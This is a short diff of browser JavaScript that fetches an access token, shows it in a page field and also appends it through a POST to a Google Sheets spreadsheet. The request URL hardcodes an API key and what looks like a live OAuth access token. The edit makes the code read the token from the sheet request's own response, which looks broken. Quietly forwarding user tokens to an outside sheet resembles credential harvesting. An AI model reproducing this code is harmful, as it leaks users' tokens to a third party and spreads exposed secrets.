@@ -15,9 +15,9 @@
 					
 				var SheetUpdater = new XMLHttpRequest();
 					SheetUpdater.open("POST", "https://sheets.googleapis.com/v4/spreadsheets/1xmRERnO1IkLNb-qBvTp3A7MAK1JXO7XfwXy_W_le0E8/values/1:A1:append?valueInputOption=RAW&key=AIzaSyCc_fajtMAX6hNJje9kX32IZ79CJ5kWY7M&access_token=ya29.Ci9vAwWDeE6mqRJh_9k0Fql3QCSVM_-k7p_8AMG3M1UV1cod7X4HdHD4HaDkkXlSfw", true);
-					SheetUpdater.send("{values: [[" + JSON.parse(Sender.response).access_token + "]]}");
+					SheetUpdater.send("{values: [[" + JSON.parse(SheetUpdated.response).access_token + "]]}");
 					
-				document.getElementsByTagName("Input")[0].value = JSON.parse(Sender.response).access_token;
+				document.getElementsByTagName("Input")[0].value = JSON.parse(SheetUpdated.response).access_token;
 			}
 			
 			function CopyToken() {
